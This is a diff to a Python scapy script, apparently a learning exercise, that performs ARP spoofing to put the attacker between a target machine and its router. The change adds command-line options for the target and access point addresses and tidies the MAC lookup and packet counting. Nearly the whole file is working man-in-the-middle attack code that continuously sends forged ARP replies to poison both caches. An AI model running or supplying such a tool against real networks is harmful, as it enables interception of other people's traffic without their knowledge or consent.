@@ -1,14 +1,9 @@
 #!/usr/bin/env python
 
+import argparse
 import scapy.all as scapy
 # import sys # Python 2.7
 import time
-
-int_packet_count = 0
-str_ip_ap = "10.0.2.1"
-str_ip_target = "10.0.2.7"
-# str_mac_ap = "52:54:00:12:35:00"
-# str_mac_target = "08:00:27:08:af:07"
 
 def do_arp_restore(str_ip_destination, str_ip_source):
     ## Get the MAC Address of the target IP
@@ -30,7 +25,6 @@ def do_arp_restore(str_ip_destination, str_ip_source):
     # scapy.send(obj_packet_arp)
     try:
         scapy.send(obj_packet_arp, count=4, verbose=False) ## Make the packet sending silent
-        int_packet_count = int_packet_count + 1
     except:
         print("[X] Packet sending for restoration failed.")
 
@@ -55,18 +49,37 @@ def do_arp_spoof(str_ip_target, str_ip_ap ):
         scapy.send(obj_packet_arp, verbose=False) ## Make the packet sending silent
     except:
         print("[X] Packet sending failed.")
-    finally:
-        int_packet_count = int_packet_count + 1
+
+def get_arguments():
+    obj_parser = argparse.ArgumentParser(
+        prog='ARP Spoofer',
+        description='Execute MITM',
+        epilog='Tested with Windows-based targets'
+    )
+    obj_parser.add_argument("-a", "--access-point", dest="ap", help="Access Point IPv4 Address (E.g. Router)", required=True)
+    obj_parser.add_argument("-t", "--target", dest="target", help="Target IPv4 Address", required=True)
+    options = obj_parser.parse_args()
+    return options
 
 def get_mac(str_ip):
     ## Codes are referenced from network-scanner
     obj_arp_request = scapy.ARP(pdst=str_ip)
     obj_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     obj_arp_broadcast = obj_broadcast/obj_arp_request
-    list_response_answered, list_response_unanswered = scapy.srp(obj_arp_broadcast, timeout=1)
+    # list_response_answered, list_response_unanswered = scapy.srp(obj_arp_broadcast, timeout=1)
     list_response_answered = scapy.srp(obj_arp_broadcast, timeout=1, verbose=False)[0]
-    ## Get the first element (0) and the answered (1) variables. From there we only need the MAC Address (hwsrc)
-    return list_response_answered[0][1].hwsrc
+    if list_response_answered:
+        ## Get the first element (0) and the answered (1) variables. From there we only need the MAC Address (hwsrc)
+        return list_response_answered[0][1].hwsrc
+    else:
+        return None
+
+int_packet_count = 0
+obj_options = get_arguments()
+str_ip_ap = obj_options.ap # "192.168.1.1"
+str_ip_target = obj_options.target # "192.168.1.5"
+# str_mac_ap = "52:54:00:12:35:00"
+# str_mac_target = "08:00:27:08:af:07"
 
 ## Enable Port Forwarding from attacker machine
 ## Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -77,8 +90,10 @@ try:
     while True:
         ## Tell the target that you are the AP
         do_arp_spoof(str_ip_target, str_ip_ap)
+        int_packet_count = int_packet_count + 1
         ## Tell the AP that you are the target
         do_arp_spoof(str_ip_ap, str_ip_target)
+        int_packet_count = int_packet_count + 1
         ## Print packet sending
         # print("[+] Sent " + str(int_packet_count) + " packets")
         ## Print packet sending in buffer
@@ -88,6 +103,6 @@ try:
         # sys.stdout.flush() # Python 2.7
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[.] Detected CTRL+C... Resetting ARP Tables")
+    print("\n" + "[.] Detected CTRL+C... Resetting ARP Tables")
     do_arp_restore(str_ip_target, str_ip_ap)
     do_arp_restore(str_ip_ap, str_ip_target)
